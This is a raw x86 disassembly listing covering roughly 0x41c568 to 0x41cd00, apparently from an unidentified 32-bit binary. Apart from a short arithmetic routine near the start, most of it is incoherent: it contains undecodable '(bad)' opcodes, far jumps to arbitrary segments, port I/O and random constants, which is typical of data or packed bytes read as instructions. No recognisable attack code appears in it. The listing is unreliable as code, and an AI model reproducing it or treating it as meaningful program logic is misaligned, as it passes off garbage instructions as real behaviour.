  41c568:	leave  
  41c569:	or     eax,0x3d920eb4
  41c56e:	and    BYTE PTR [edi-0x78],bl
  41c571:	sahf   
  41c572:	sub    ecx,esi
  41c574:	xchg   ebx,eax
  41c575:	(bad)  
  41c576:	push   esp
  41c577:	xlat   BYTE PTR ds:[ebx]
  41c578:	and    edi,esi
  41c57a:	ins    BYTE PTR es:[edi],dx
  41c57b:	(bad)  
  41c57c:	add    al,0xea
  41c57e:	jae    0x41c5a9
  41c580:	sub    al,BYTE PTR [ecx+0x33c833d6]
  41c586:	shr    BYTE PTR [ebx],1
  41c588:	retf   0xce2b
  41c58b:	xor    ecx,eax
  41c58d:	mov    DWORD PTR [ebp+0x8],ecx
  41c590:	mov    ecx,DWORD PTR [ebp+0x8]
  41c593:	mov    edx,DWORD PTR [ebp+0x8]
  41c596:	xor    ecx,eax
  41c598:	imul   edx,edx,0x5708f2
  41c59e:	add    ecx,esi
  41c5a0:	lea    ecx,[ebp+ecx*4-0x64]
  41c5a4:	mov    edi,DWORD PTR [ecx]
  41c5a6:	add    edx,edi
  41c5a8:	mov    DWORD PTR [ecx],edx
  41c5aa:	mov    ecx,DWORD PTR [ebp+0x8]
  41c5ad:	xor    ecx,eax
  41c5af:	add    ecx,esi
  41c5b1:	jne    0x41a1f0
  41c5b7:	mov    ecx,DWORD PTR [ebp-0x14]
  41c5ba:	mov    edx,DWORD PTR [ebp+0x8]
  41c5bd:	xor    ecx,eax
  41c5bf:	jmp    0x41e94c
  41c5c4:	js     0x41c5e5
  41c5c6:	pop    ebx
  41c5c7:	out    0xdb,eax
  41c5c9:	jnp    0x41c643
  41c5cb:	rep ins DWORD PTR es:[edi],dx
  41c5cd:	pop    ebx
  41c5ce:	jns    0x41c591
  41c5d0:	fs xchg esp,eax
  41c5d2:	xor    DWORD PTR [ecx-0x2],ebx
  41c5d5:	loope  0x41c654
  41c5d7:	jp     0x41c5e3
  41c5d9:	pop    edi
  41c5da:	jp     0x41c656
  41c5dc:	jge    0x41c577
  41c5de:	jge    0x41c605
  41c5e0:	sub    ch,BYTE PTR [esp+edi*8]
  41c5e3:	fsubp  st(6),st
  41c5e5:	gs ss jae 0x41c632
  41c5e9:	add    eax,0x9f357c0
  41c5ee:	scas   eax,DWORD PTR es:[edi]
  41c5ef:	neg    DWORD PTR [ebp+0x7c]
  41c5f2:	test   BYTE PTR [ebx-0x5fd65df1],0x5c
  41c5f9:	xchg   DWORD PTR [edx+edx*4+0x28],esp
  41c5fd:	cmp    edx,DWORD PTR [edx+0x5]
  41c600:	call   0x177d:0xe1c7d99d
  41c607:	out    0xed,eax
  41c609:	cdq    
  41c60a:	mov    cl,0x6f
  41c60c:	mov    al,ds:0xac973608
  41c611:	std    
  41c612:	imul   edx,DWORD PTR [esi-0x723fa147],0x1c
  41c619:	mov    dl,ch
  41c61b:	repz sub edx,eax
  41c61e:	mov    WORD PTR [esi+0x533b9e18],es
  41c624:	cmp    eax,0x374e2335
  41c629:	retf   
  41c62a:	lods   al,BYTE PTR ds:[esi]
  41c62b:	jmp    0x25e8:0x7636123e
  41c632:	mov    bl,0xfa
  41c634:	ret    
  41c635:	xor    eax,0x666e646d
  41c63a:	or     BYTE PTR [ebx-0x3f7bdd06],0x75
  41c641:	sbb    DWORD PTR [ecx-0x35],ecx
  41c644:	cmp    eax,0xe23baca9
  41c649:	or     al,0xbc
  41c64b:	add    ah,ch
  41c64d:	stos   DWORD PTR es:[edi],eax
  41c64e:	push   ds
  41c64f:	int    0x26
  41c651:	adc    al,0x3b
  41c653:	frstor [ecx-0x5066a7d1]
  41c659:	out    dx,eax
  41c65a:	aam    0x12
  41c65c:	or     BYTE PTR [ebp+0x68],ch
  41c65f:	sbb    ebp,DWORD PTR ds:0xe8959fb3
  41c665:	push   0xffffffa0
  41c667:	gs pop es
  41c669:	or     esp,DWORD PTR [ebx+0x2a]
  41c66c:	mov    ?,WORD PTR [eax+0x76]
  41c66f:	test   BYTE PTR [ebp-0x630fc661],ch
  41c675:	mov    WORD PTR [edi],es
  41c677:	in     al,0xb0
  41c679:	aas    
  41c67a:	or     al,0xaf
  41c67c:	jbe    0x41c64c
  41c67e:	loope  0x41c6c0
  41c680:	sub    ah,BYTE PTR [eax-0x4377c708]
  41c686:	call   0x3dc3:0x49444f26
  41c68d:	test   BYTE PTR cs:[edx],bl
  41c690:	into   
  41c691:	ret    
  41c692:	ret    0xf758
  41c695:	mov    al,0x88
  41c697:	mov    bl,0xc8
  41c699:	push   ebx
  41c69a:	or     al,0xd7
  41c69c:	mov    ecx,0x3d48214e
  41c6a1:	cmp    BYTE PTR [ebp+ecx*2+0x2d89c811],ch
  41c6a8:	dec    ebp
  41c6a9:	add    eax,0x32471cd7
  41c6ae:	dec    DWORD PTR [ebx-0x18c35d]
  41c6b4:	jmp    0xc8f7:0x26856872
  41c6bb:	xchg   edx,eax
  41c6bd:	jmp    0xcfd0:0xbfc11072
  41c6c4:	xor    ch,dl
  41c6c6:	xchg   esp,eax
  41c6c7:	js     0x41c66d
  41c6c9:	add    al,0x16
  41c6cb:	sub    eax,0xf03a12d3
  41c6d0:	jl     0x41c6e7
  41c6d2:	nop
  41c6d3:	in     al,0x43
  41c6d5:	jno    0x41c68d
  41c6d7:	jne    0x41c734
  41c6d9:	popf   
  41c6da:	add    eax,0xfbba4abd
  41c6df:	mov    ebp,0xe9f065b3
  41c6e4:	cmp    eax,0x88236203
  41c6e9:	cmp    dl,ah
  41c6eb:	jge    0x41c6fd
  41c6ed:	add    eax,0x3a84ed19
  41c6f2:	mov    ebx,0x47750ad2
  41c6f7:	in     al,dx
  41c6f8:	jp     0x41c74c
  41c6fa:	xor    bh,dl
  41c6fc:	loopne 0x41c716
  41c6fe:	sbb    esp,DWORD PTR [ebx+0x75]
  41c701:	test   ebp,0xb48dc511
  41c707:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c708:	pusha  
  41c709:	aam    0xa7
  41c70b:	jno    0x41c758
  41c70d:	lods   al,BYTE PTR ds:[esi]
  41c70e:	nop
  41c70f:	sbb    ah,BYTE PTR [eax-0x69]
  41c712:	mov    dh,0xb8
  41c714:	out    dx,al
  41c715:	ins    DWORD PTR es:[edi],dx
  41c716:	xor    al,0x56
  41c718:	jo     0x41c74d
  41c71a:	xchg   esi,edx
  41c71c:	repz ret 0x50a5
  41c720:	push   edi
  41c721:	mov    ch,0x89
  41c723:	add    bl,BYTE PTR [ecx-0xea5c377]
  41c729:	cld    
  41c72a:	add    DWORD PTR [edx+ebp*2+0x544a7886],esp
  41c731:	pop    esp
  41c732:	add    dl,BYTE PTR [edi-0x3eb7f0ee]
  41c738:	cwde   
  41c739:	inc    ebx
  41c73a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c73b:	and    al,0xd8
  41c73d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c73e:	aas    
  41c73f:	leave  
  41c740:	xchg   ebp,eax
  41c741:	ss movs BYTE PTR es:[edi],BYTE PTR es:[esi]
  41c744:	mov    edi,es
  41c746:	sbb    BYTE PTR [edi+0x2e],cl
  41c749:	into   
  41c74a:	dec    esp
  41c74b:	jno    0x41c6e5
  41c74d:	out    0xbf,al
  41c74f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c750:	fsub   st,st(1)
  41c752:	mov    eax,0x63ad140d
  41c757:	imul   esi,DWORD PTR [ebp-0x34f2a4fc],0xfe4b5db3
  41c761:	sub    eax,0x27147e7e
  41c766:	icebp  
  41c767:	iret   
  41c768:	in     al,dx
  41c769:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c76a:	push   ebp
  41c76b:	pusha  
  41c76c:	fcom   QWORD PTR [ebp+ecx*2-0x72]
  41c770:	lods   al,BYTE PTR ds:[esi]
  41c771:	add    bh,BYTE PTR [ecx+ebp*2]
  41c774:	(bad)  
  41c775:	fild   QWORD PTR [eax]
  41c777:	jo     0x41c7cb
  41c779:	loope  0x41c77c
  41c77b:	jbe    0x41c750
  41c77d:	mov    es,WORD PTR [edi-0x65a92951]
  41c783:	and    BYTE PTR [eax+0x62],bl
  41c786:	xchg   ebx,eax
  41c787:	sub    DWORD PTR [esi+ebx*1],ebx
  41c78a:	push   esi
  41c78b:	mov    ecx,0x33fb5ada
  41c790:	mov    esi,0x3eaf935a
  41c795:	sbb    BYTE PTR [edx],0xa9
  41c798:	dec    eax
  41c799:	fwait
  41c79a:	jl     0x2a345465
  41c7a0:	lods   al,BYTE PTR ds:[esi]
  41c7a1:	ror    BYTE PTR [eax],cl
  41c7a3:	cmp    ecx,DWORD PTR [eax-0x9]
  41c7a6:	xchg   DWORD PTR [esi+0x51],esp
  41c7a9:	pushf  
  41c7aa:	cmp    al,0x75
  41c7ac:	scas   al,BYTE PTR es:[edi]
  41c7ad:	xchg   DWORD PTR [esi-0x6],edi
  41c7b0:	fisttp WORD PTR [ecx+0x32efe4df]
  41c7b6:	push   es
  41c7b7:	out    dx,al
  41c7b8:	push   ebx
  41c7b9:	into   
  41c7ba:	fcomp  QWORD PTR [ebx]
  41c7bc:	je     0x41c753
  41c7be:	nop    DWORD PTR [edi+ebp*8+0x4f67d9b2]
  41c7c6:	imul   edx,eax,0xb7ec32f5
  41c7cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c7cd:	retf   
  41c7ce:	dec    eax
  41c7cf:	dec    edi
  41c7d0:	sti    
  41c7d1:	sbb    DWORD PTR [eax],edx
  41c7d3:	cld    
  41c7d4:	or     BYTE PTR [eax+0x2df8ea97],bh
  41c7da:	sahf   
  41c7db:	mov    ?,WORD PTR [ebp-0x70b7035]
  41c7e1:	adc    BYTE PTR [edi],dh
  41c7e3:	inc    esp
  41c7e4:	popf   
  41c7e5:	adc    DWORD PTR [edx+0x25],esi
  41c7e8:	fs mov ah,0xdb
  41c7eb:	out    dx,eax
  41c7ec:	sar    BYTE PTR [eax+0xe32046b],0xb4
  41c7f3:	arpl   WORD PTR [ebp+0x3a],bp
  41c7f6:	add    al,BYTE PTR [edi+eiz*8]
  41c7f9:	enter  0x518,0xe4
  41c7fd:	cmp    BYTE PTR [eax],ah
  41c7ff:	loope  0x41c791
  41c801:	aad    0xd9
  41c803:	pop    eax
  41c804:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c805:	das    
  41c806:	int3   
  41c807:	mov    dh,0x4d
  41c809:	icebp  
  41c80a:	(bad)  
  41c80b:	jae    0x41c82b
  41c80d:	pusha  
  41c80e:	jbe    0x41c836
  41c810:	pop    es
  41c811:	ret    0x8653
  41c814:	mov    bh,BYTE PTR [ebp+0x66]
  41c817:	enter  0x2f9f,0x80
  41c81b:	test   eax,0xcd87a33f
  41c820:	cld    
  41c821:	stos   BYTE PTR es:[edi],al
  41c822:	dec    esi
  41c823:	push   edx
  41c824:	jle    0x41c7b2
  41c826:	pop    es
  41c827:	mov    dl,0xd8
  41c829:	fcom   st(6)
  41c82b:	push   ds
  41c82c:	adc    dl,BYTE PTR [ebx+ecx*1-0x72e8942b]
  41c833:	add    eax,0x3a5c94b1
  41c838:	fs sahf 
  41c83a:	shr    DWORD PTR [ebx+0x659976e6],cl
  41c840:	add    DWORD PTR [ebp+0x47],eax
  41c843:	sbb    eax,0xdeb8f3df
  41c848:	stc    
  41c849:	xchg   esp,eax
  41c84a:	dec    ebp
  41c84b:	adc    eax,0xca46482d
  41c850:	ds push edx
  41c852:	mov    cs,WORD PTR [ecx]
  41c854:	mov    ss,WORD PTR [eax+0x7f]
  41c857:	retf   
  41c858:	cld    
  41c859:	ja     0x41c84b
  41c85b:	mov    DWORD PTR [esp+ebp*2-0x49521b4f],ebp
  41c862:	and    BYTE PTR [edx-0x34],0x13
  41c866:	mov    esp,DWORD PTR [ebx+0x32]
  41c869:	or     bh,ch
  41c86b:	pop    ebp
  41c86c:	and    al,BYTE PTR [eax]
  41c86e:	pushf  
  41c86f:	mov    ch,0xc7
  41c871:	fimul  DWORD PTR [esp+edi*1-0x3]
  41c875:	and    eax,0xbc750c73
  41c87a:	out    0x4f,al
  41c87c:	fld    TBYTE PTR [esi+0x6c2b485a]
  41c882:	and    ch,0xd2
  41c885:	(bad)  
  41c886:	(bad)  
  41c887:	pop    eax
  41c888:	push   edx
  41c889:	dec    edi
  41c88a:	xchg   ebp,eax
  41c88b:	iret   
  41c88c:	mov    eax,0x6ef60fb
  41c891:	pop    edx
  41c892:	mov    ecx,0xebe03865
  41c897:	inc    esp
  41c898:	add    esi,DWORD PTR [esi-0x56]
  41c89b:	pop    edx
  41c89c:	dec    esp
  41c89d:	mov    al,0x74
  41c89f:	sub    ch,BYTE PTR [ecx+0xef9a05f]
  41c8a5:	sub    al,0x81
  41c8a7:	mov    bh,0xff
  41c8a9:	add    DWORD PTR [ebp+0x5e80a29d],edi
  41c8af:	xor    ebx,eax
  41c8b1:	hlt    
  41c8b2:	jne    0x41c888
  41c8b4:	(bad)  
  41c8b5:	in     al,dx
  41c8b6:	add    BYTE PTR [esi-0x5a390123],bh
  41c8bc:	pop    edx
  41c8bd:	out    dx,eax
  41c8be:	lea    ebx,[ecx]
  41c8c0:	mov    cl,0x25
  41c8c2:	xchg   edx,eax
  41c8c3:	cld    
  41c8c4:	mov    dh,BYTE PTR es:[esi+0x13]
  41c8c8:	push   0x9a116691
  41c8cd:	add    eax,0x58f93c55
  41c8d2:	and    eax,0xc88f8789
  41c8d7:	add    DWORD PTR [esi+0x47bdc65f],esp
  41c8dd:	jle    0x41c898
  41c8df:	rcl    BYTE PTR [esi],cl
  41c8e1:	repz xchg esi,eax
  41c8e3:	(bad)  
  41c8e4:	cmp    esp,DWORD PTR [esi]
  41c8e6:	xchg   ecx,eax
  41c8e7:	test   al,0xf4
  41c8e9:	inc    eax
  41c8ea:	sar    DWORD PTR [eax+0x36],cl
  41c8ed:	and    BYTE PTR [edi],dl
  41c8ef:	shl    BYTE PTR [ebp+0x7c],cl
  41c8f2:	pop    edx
  41c8f3:	addr16 popf 
  41c8f5:	mov    BYTE PTR [eax+ebp*4+0x72],bh
  41c8f9:	fbld   TBYTE PTR [ecx+0x3dd64802]
  41c8ff:	cmp    eax,0x491f4265
  41c904:	adc    ecx,esi
  41c906:	dec    BYTE PTR [edi+0x32]
  41c909:	scas   eax,DWORD PTR es:[edi]
  41c90a:	dec    edx
  41c90b:	mov    ds:0x429ab258,eax
  41c910:	pop    esp
  41c911:	(bad)  
  41c912:	fcom   st(5)
  41c914:	(bad)  
  41c915:	jmp    0xbcd3:0xdb109a33
  41c91c:	add    esp,ecx
  41c91e:	adc    esp,DWORD PTR [ecx]
  41c920:	jmp    0x41c8b9
  41c922:	and    edx,edx
  41c924:	std    
  41c925:	jp     0x41c947
  41c927:	mov    dh,0xaa
  41c929:	test   eax,0xae49d213
  41c92e:	pusha  
  41c92f:	jmp    0x4db37b30
  41c934:	gs dec ecx
  41c936:	jae    0x41c91c
  41c938:	sub    eax,0xb0c28d4
  41c93d:	lock cld 
  41c93f:	call   0x1c2a:0xb6b8aa49
  41c946:	ret    
  41c947:	add    al,0x78
  41c949:	dec    ebx
  41c94a:	jno    0x41c8ff
  41c94c:	xchg   BYTE PTR [ebx+0x73302e8d],dh
  41c952:	fcmovnu st,st(5)
  41c954:	inc    edi
  41c955:	shl    DWORD PTR [esi],0x72
  41c958:	loope  0x41c9c9
  41c95a:	enter  0xf4dc,0xf2
  41c95e:	out    dx,eax
  41c95f:	sub    DWORD PTR [edi+0x2a],edx
  41c962:	aam    0x28
  41c964:	mov    eax,0x3bb4ff8
  41c969:	sub    eax,0xc5fa5418
  41c96e:	mov    eax,0xe6a18d9d
  41c973:	(bad)  
  41c974:	out    dx,eax
  41c975:	cmp    ecx,esi
  41c977:	retf   
  41c978:	mov    ecx,0xeef7e0ee
  41c97d:	mov    BYTE PTR [edi],bl
  41c97f:	mov    esi,0x722b8f56
  41c984:	jbe    0x41c9cb
  41c986:	ja     0x41c977
  41c988:	aas    
  41c989:	lods   eax,DWORD PTR ds:[esi]
  41c98a:	and    bl,BYTE PTR ds:0x7e1399e8
  41c990:	adc    eax,0xa7595925
  41c995:	mov    al,ds:0xff0edfc4
  41c99a:	lock outs dx,BYTE PTR ds:[esi]
  41c99c:	push   ebx
  41c99d:	hlt    
  41c99e:	sti    
  41c99f:	sbb    BYTE PTR [ebx+0x3d],ch
  41c9a2:	push   ss
  41c9a3:	or     BYTE PTR [edi-0x24660e4f],bh
  41c9a9:	adc    ebp,esp
  41c9ab:	dec    eax
  41c9ac:	jge    0x41c999
  41c9ae:	sub    DWORD PTR [eax+eiz*1-0x406d388f],esp
  41c9b5:	dec    ebp
  41c9b6:	pop    ecx
  41c9b7:	int3   
  41c9b8:	pusha  
  41c9b9:	xchg   ebp,eax
  41c9ba:	into   
  41c9bb:	rep ins WORD PTR es:[edi],dx
  41c9be:	(bad)  
  41c9bf:	fisttp WORD PTR [eax-0x5b6ced50]
  41c9c5:	dec    ebx
  41c9c6:	jne    0x41c977
  41c9c8:	fiadd  WORD PTR [edx-0x58f598ce]
  41c9ce:	inc    edi
  41c9cf:	pop    ss
  41c9d0:	pop    ebx
  41c9d1:	dec    esi
  41c9d2:	rcl    DWORD PTR [ebx*1+0x62fad95c],0xac
  41c9da:	mov    al,BYTE PTR [eax-0x33]
  41c9dd:	add    DWORD PTR [edi-0x6e4d7b8],eax
  41c9e3:	adc    al,0x2b
  41c9e5:	jnp    0x41c998
  41c9e7:	jnp    0x41ca61
  41c9e9:	rol    DWORD PTR [edi-0x19],cl
  41c9ec:	pusha  
  41c9ed:	outs   dx,DWORD PTR ds:[esi]
  41c9ee:	cmp    DWORD PTR [ebx+0x3012641b],eax
  41c9f4:	xchg   ecx,eax
  41c9f5:	das    
  41c9f6:	inc    esi
  41c9f7:	jae    0x41ca23
  41c9f9:	es inc esi
  41c9fb:	mov    eax,0x1cc82b6
  41ca00:	xchg   edi,eax
  41ca01:	xor    al,0xf9
  41ca03:	test   dh,ah
  41ca05:	inc    esp
  41ca06:	mov    bl,0x9b
  41ca08:	sbb    eax,0x322d2ccc
  41ca0d:	into   
  41ca0e:	jne    0x41ca20
  41ca10:	mov    cl,0x31
  41ca12:	dec    ebx
  41ca13:	and    ecx,DWORD PTR [edi]
  41ca15:	lods   al,BYTE PTR ds:[esi]
  41ca16:	jo     0x41c9d9
  41ca18:	push   cs
  41ca19:	es jmp 0x1ca45bb5
  41ca1f:	mov    eax,ds:0x2984189b
  41ca24:	add    BYTE PTR [edx+0x7f],ch
  41ca27:	mov    eax,ds:0x54503cdf
  41ca2c:	pusha  
  41ca2d:	jmp    0x3186:0xbc40fa5a
  41ca34:	scas   al,BYTE PTR es:[edi]
  41ca35:	das    
  41ca36:	push   0xffffffc2
  41ca38:	rol    BYTE PTR es:[esi+0x1f6302c9],cl
  41ca3f:	fdiv   DWORD PTR ds:0x7fafe35b
  41ca45:	xor    edx,ebx
  41ca47:	in     eax,0x95
  41ca49:	mov    ah,0xae
  41ca4b:	or     dh,BYTE PTR [ebx+0x29]
  41ca4e:	test   ch,dl
  41ca50:	sbb    ecx,DWORD PTR [edx+0x6e97736a]
  41ca56:	pop    ss
  41ca57:	jae    0x41ca2e
  41ca59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca5a:	push   esi
  41ca5b:	imul   edi,DWORD PTR [ecx+ecx*4+0x40],0xb67e13b6
  41ca63:	jecxz  0x41cabd
  41ca65:	dec    eax
  41ca66:	mov    dl,0x7f
  41ca68:	pusha  
  41ca69:	ret    
  41ca6a:	mov    bh,0x4c
  41ca6c:	pop    esi
  41ca6d:	inc    ebp
  41ca6e:	or     edi,DWORD PTR [ebx+0x6a]
  41ca71:	xor    esi,ebx
  41ca73:	xor    eax,DWORD PTR [esi+0x19afed2e]
  41ca79:	int    0x3d
  41ca7b:	jg     0x41ca92
  41ca7d:	sti    
  41ca7e:	hlt    
  41ca7f:	inc    dh
  41ca81:	jns    0x41ca8e
  41ca83:	ins    BYTE PTR es:[edi],dx
  41ca84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca85:	or     ebp,DWORD PTR [esi]
  41ca87:	or     eax,0xc7365790
  41ca8c:	xchg   ebx,eax
  41ca8d:	pop    esi
  41ca8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca8f:	sbb    DWORD PTR [edi-0x146d58fc],esp
  41ca95:	fidiv  WORD PTR [ebx+edx*2]
  41ca98:	mov    BYTE PTR [eax+0x2f],ch
  41ca9b:	out    dx,eax
  41ca9c:	inc    edi
  41ca9d:	and    al,bh
  41ca9f:	dec    DWORD PTR [esi-0x7d]
  41caa2:	test   DWORD PTR [edx+eiz*1+0x748c78a5],ecx
  41caa9:	or     eax,0xaa530a6c
  41caae:	retf   
  41caaf:	adc    DWORD PTR [ecx],ebp
  41cab1:	out    0xdb,al
  41cab3:	cs inc ecx
  41cab5:	int3   
  41cab6:	pop    edi
  41cab7:	fbstp  TBYTE PTR [edx]
  41cab9:	repnz mov ebx,0x9bc8d0cd
  41cabf:	ins    DWORD PTR es:[edi],dx
  41cac0:	arpl   WORD PTR [ebx+0x3d0dea75],cx
  41cac6:	cld    
  41cac7:	and    ah,dl
  41cac9:	leave  
  41caca:	test   BYTE PTR [edi-0x69d30ef7],bl
  41cad0:	pop    esp
  41cad1:	sbb    al,0x28
  41cad3:	cmp    al,0x3e
  41cad6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cad7:	or     ebx,edx
  41cad9:	stc    
  41cada:	add    ch,BYTE PTR [edx-0x29a81e11]
  41cae0:	add    ebp,0xffffffd6
  41cae3:	scas   eax,DWORD PTR es:[edi]
  41cae4:	or     ah,BYTE PTR [edi]
  41cae6:	pop    ds
  41cae7:	(bad)  
  41cae9:	mov    dl,0x95
  41caeb:	xchg   ecx,eax
  41caec:	mov    DWORD PTR [edx+ebp*4],edx
  41caef:	inc    ebp
  41caf0:	loopne 0x41cb52
  41caf2:	cmp    bh,BYTE PTR [edx]
  41caf4:	repz mov eax,0x378c8071
  41cafa:	mov    dh,0x3
  41cafc:	add    al,0x8
  41cafe:	xor    eax,DWORD PTR [ecx-0x76518ce0]
  41cb04:	(bad)  
  41cb05:	mov    ds:0xcae98d53,eax
  41cb0a:	in     al,dx
  41cb0b:	(bad)  
  41cb0c:	fisttp DWORD PTR [ecx-0x15293342]
  41cb12:	add    ah,dl
  41cb14:	ja     0x41cb43
  41cb16:	jbe    0x41cb55
  41cb18:	cmp    BYTE PTR [edi+0x3c527681],ah
  41cb1e:	and    al,dh
  41cb20:	retf   
  41cb21:	jbe    0x41cb06
  41cb23:	xor    esi,DWORD PTR [esi+0x726d4b32]
  41cb29:	fbstp  TBYTE PTR [eax]
  41cb2b:	sbb    cl,BYTE PTR [ecx+ebp*4+0x5cfbd1b4]
  41cb32:	push   edi
  41cb33:	ret    
  41cb34:	xor    al,0x4c
  41cb36:	in     al,dx
  41cb37:	fld    TBYTE PTR [edx+0x3d]
  41cb3a:	imul   BYTE PTR [ebx+0x15e02f6e]
  41cb40:	xor    DWORD PTR [edx-0x1b],ebp
  41cb43:	push   0x92790376
  41cb48:	imul   ebp,DWORD PTR [edx],0x28f952ca
  41cb4e:	ror    edi,1
  41cb50:	mov    ebp,0xc3813cf1
  41cb55:	fadd   DWORD PTR [edx]
  41cb57:	jecxz  0x41cb15
  41cb59:	and    al,0x7e
  41cb5b:	jle    0x41cb7e
  41cb5d:	stos   BYTE PTR es:[edi],al
  41cb5e:	or     DWORD PTR [esi+0x74],esp
  41cb61:	mov    BYTE PTR ds:[ecx-0x2e],0x40
  41cb66:	xchg   ebp,esp
  41cb68:	sbb    bh,BYTE PTR [edi+0x3015f922]
  41cb6e:	loope  0x41cbc5
  41cb70:	jmp    0x5582:0x3c3042e4
  41cb77:	add    BYTE PTR [eax],ah
  41cb79:	adc    al,0x4b
  41cb7b:	or     cl,bl
  41cb7d:	out    0x6e,al
  41cb7f:	mov    ah,0x3d
  41cb81:	int    0xd5
  41cb83:	int    0xb1
  41cb85:	aaa    
  41cb86:	xchg   edx,eax
  41cb87:	fstp   DWORD PTR [ecx-0x2b]
  41cb8a:	jl     0x41cb59
  41cb8c:	in     eax,dx
  41cb8d:	push   ebx
  41cb8e:	leave  
  41cb8f:	cwde   
  41cb90:	mov    esi,DWORD PTR [ecx-0x7a]
  41cb93:	mov    ebp,0xbea24d5e
  41cb98:	nop
  41cb99:	mov    bh,0x97
  41cb9b:	xor    eax,0xca0d75e9
  41cba0:	stos   DWORD PTR es:[edi],eax
  41cba1:	xlat   BYTE PTR ds:[ebx]
  41cba2:	sbb    DWORD PTR [ecx+edi*4+0x550db169],ecx
  41cba9:	test   BYTE PTR gs:[ebp-0x66104f37],0x68
  41cbb1:	pop    edx
  41cbb2:	(bad)  
  41cbb3:	gs mov ebp,0xa747e0b6
  41cbb9:	loope  0x41cbe7
  41cbbb:	(bad)  
  41cbbc:	cmc    
  41cbbd:	xchg   edx,eax
  41cbbe:	popf   
  41cbbf:	dec    ecx
  41cbc0:	dec    ebp
  41cbc1:	xchg   esp,eax
  41cbc2:	pop    ds
  41cbc3:	(bad)  
  41cbc4:	jmp    0x468f:0xe425a855
  41cbcb:	adc    ecx,DWORD PTR cs:[edx-0x63]
  41cbcf:	jno    0x41cc0b
  41cbd1:	mov    ecx,fs
  41cbd3:	and    DWORD PTR [edi+0x6c16d74a],0x7e
  41cbda:	lock mov esp,0xa5edd9a7
  41cbe0:	mov    eax,ds:0x1a5f5def
  41cbe5:	lock mov ch,0x93
  41cbe8:	fidivr WORD PTR [esi-0x70a1495f]
  41cbee:	xchg   esp,eax
  41cbef:	pop    edx
  41cbf0:	cli    
  41cbf1:	mov    al,ds:0x1982e35b
  41cbf6:	xor    esi,DWORD PTR [edi]
  41cbf8:	je     0x41cb95
  41cbfa:	mov    cl,0xe7
  41cbfc:	jg     0x41cb8c
  41cbfe:	shl    BYTE PTR [edi+0x5e87c686],1
  41cc04:	cmp    eax,0xe89591b0
  41cc09:	mov    eax,0x295d2f2b
  41cc0e:	push   ebx
  41cc0f:	pop    ebp
  41cc10:	mov    edx,0x9da3da9e
  41cc15:	or     al,bh
  41cc17:	jbe    0x41cbd0
  41cc19:	ret    0xd406
  41cc1c:	xchg   edx,eax
  41cc1d:	(bad)  
  41cc1e:	cli    
  41cc1f:	xchg   ebp,eax
  41cc20:	daa    
  41cc21:	mov    edx,fs
  41cc23:	fs jp  0x41cbfc
  41cc26:	fs es loop 0x41cc65
  41cc2a:	push   ds
  41cc2b:	mov    ch,0xdb
  41cc2d:	or     eax,DWORD PTR [ecx+ecx*2-0x2]
  41cc31:	test   eax,0x3f9321e2
  41cc36:	pop    esi
  41cc37:	imul   ebp,edx,0xd7afd931
  41cc3d:	(bad)  
  41cc3e:	xor    al,0xd4
  41cc40:	ja     0x41cc6b
  41cc42:	sbb    eax,0xaf98e508
  41cc47:	jne    0x41cc0c
  41cc49:	dec    edi
  41cc4a:	mov    cl,BYTE PTR [ebx-0x31]
  41cc4d:	sbb    ebp,DWORD PTR [ebx-0x7aa7ad4d]
  41cc53:	or     cl,bh
  41cc55:	ja     0x41ccbe
  41cc57:	ret    
  41cc58:	mov    edx,0x8c9243b1
  41cc5d:	sbb    edi,DWORD PTR [eax+0x282bf75b]
  41cc63:	imul   ecx,DWORD PTR [ebp+0x12],0xf12f5cf5
  41cc6a:	dec    eax
  41cc6b:	adc    eax,0x6d85598a
  41cc70:	lahf   
  41cc71:	inc    ebp
  41cc72:	in     eax,dx
  41cc73:	loop   0x41cc71
  41cc75:	xlat   BYTE PTR es:[ebx]
  41cc77:	int    0x39
  41cc79:	mov    ds:0x59e30240,al
  41cc7e:	mov    ch,0xd1
  41cc80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc81:	jnp    0x41cc8f
  41cc83:	mov    cl,0x4a
  41cc85:	mov    esp,0x4bcb82ac
  41cc8a:	pop    esp
  41cc8b:	push   cs
  41cc8c:	jle    0x41ccc8
  41cc8e:	clc    
  41cc8f:	mov    edi,0xcf79a4e2
  41cc94:	push   0xcd6e3569
  41cc99:	inc    ebx
  41cc9a:	cmc    
  41cc9b:	sahf   
  41cc9c:	ja     0x41ccf8
  41cc9e:	jb     0x41cc78
  41cca0:	jb     0x41cc8e
  41cca2:	and    al,0x7c
  41cca4:	ds jb  0x41cc4b
  41cca7:	or     edx,ecx
  41cca9:	stos   BYTE PTR es:[edi],al
  41ccaa:	jbe    0x41cc2f
  41ccac:	sub    DWORD PTR [esi+0x77b329c5],esi
  41ccb2:	xchg   esi,eax
  41ccb3:	and    DWORD PTR [ebx-0x4a0e0f7b],esp
  41ccb9:	fwait
  41ccba:	out    0x66,al
  41ccbc:	(bad)  
  41ccbd:	jmp    0x41cc59
  41ccbf:	pop    ecx
  41ccc0:	cs pushf 
  41ccc2:	test   eax,0x639bbd90
  41ccc7:	xchg   ecx,eax
  41ccc8:	cmp    DWORD PTR [eax+0x79],esi
  41cccb:	and    DWORD PTR [edx-0x17db41c1],ebx
  41ccd1:	in     al,dx
  41ccd2:	and    WORD PTR [esi-0x26c92e80],dx
  41ccd9:	aaa    
  41ccda:	imul   esp,DWORD PTR [edx],0x83451cc
  41cce0:	cmp    ch,cl
  41cce2:	sub    DWORD PTR [ecx+0x5c4514a0],0x966dac49
  41ccec:	bound  ecx,QWORD PTR [eax-0x447ee71e]
  41ccf2:	sbb    al,0x27
  41ccf4:	ja     0x41ccab
  41ccf6:	adc    BYTE PTR [esi-0x12e88492],0x32
  41ccfd:	xchg   esp,eax
  41ccfe:	cwde   
  41ccff:	push   esi
  41cd00:	scas   eax,DWORD PTR es:[edi]
